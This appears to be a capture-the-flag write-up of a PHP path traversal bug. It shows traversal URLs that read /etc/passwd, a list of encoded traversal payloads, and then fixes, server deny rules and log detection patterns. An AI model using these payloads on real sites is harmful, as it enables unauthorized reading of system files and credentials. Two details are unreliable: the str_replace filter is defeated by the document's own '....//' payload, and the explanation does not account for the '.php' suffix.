# Path Traversal Vulnerability - File Access Control Bypass

## What I Found
The website uses a URL parameter to include files dynamically, which allows attackers to access any file on the server by manipulating the file path.

## How I Discovered It

### Initial Observation
I noticed the website uses this URL pattern:
```
http://ip/index.php?page=survey
```

This suggests the server is including files based on user input, which could be vulnerable to path traversal attacks.

### Testing for Path Traversal
I tested various payloads to see if I could access files outside the intended directory:

**Basic test:**
```
http://ip/index.php?page=../
```

**System file access:**
```
http://ip/index.php?page=../../../../../../../../../etc/passwd
```

### Success
The path traversal attack worked, and I was able to access the `/etc/passwd` file, which contained the flag.

## What This Vulnerability Allows

**File System Access:**
- Read any file the web server can access
- Access configuration files (`/etc/passwd`, `.env`, `config.php`)
- View source code and database credentials

**Information Disclosure:**
- System usernames and information
- Application configuration details
- Database connection strings
- API keys and secrets

## How Path Traversal Works

The vulnerable code likely looks something like:
```php
<?php
$page = $_GET['page'];
include($page . '.php');
?>
```

When I input `../../../../../../../../../etc/passwd`, it becomes:
```php
include('../../../../../../../../../etc/passwd.php');
```

The `../` sequences move up directories until reaching the root, then access `/etc/passwd`.

## Prevention Methods

### 1. Input Whitelisting
```php
$allowed_pages = ['survey', 'home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include($page . '.php');
} else {
    // Show error or default page
}
```

### 2. Path Sanitization
```php
$page = basename($_GET['page']); // Removes directory paths
$page = str_replace(['../', '..\\'], '', $page); // Remove traversal sequences
```

### 3. Absolute Path Validation
```php
$base_dir = '/var/www/html/pages/';
$file_path = realpath($base_dir . $_GET['page'] . '.php');

if (strpos($file_path, $base_dir) === 0 && file_exists($file_path)) {
    include($file_path);
}
```

### 4. Web Server Configuration
```apache
# Apache - Block access to sensitive files
<FilesMatch "\.(env|passwd|shadow)$">
    Require all denied
</FilesMatch>
```

```nginx
# Nginx - Block path traversal attempts
location ~ \.\./  {
    deny all;
}
```

## Common Path Traversal Payloads

```
../
..\/
..%2f
..%5c
%2e%2e%2f
%2e%2e%5c
....//
....\\
```

## Detection and Monitoring

Watch for these patterns in logs:
- Multiple `../` sequences in URLs
- Access to system files (`/etc/passwd`, `/etc/shadow`)
- Unusual file extension requests
- Encoded traversal sequences (`%2e%2e%2f`)

## Key Lessons

1. **Never trust user input** - Always validate and sanitize file paths
2. **Use whitelisting** - Only allow access to approved files
3. **Implement proper access controls** - Web server should block sensitive files
4. **Monitor for attacks** - Log and alert on suspicious file access patterns

This vulnerability can lead to complete system compromise if sensitive configuration files containing credentials are accessed.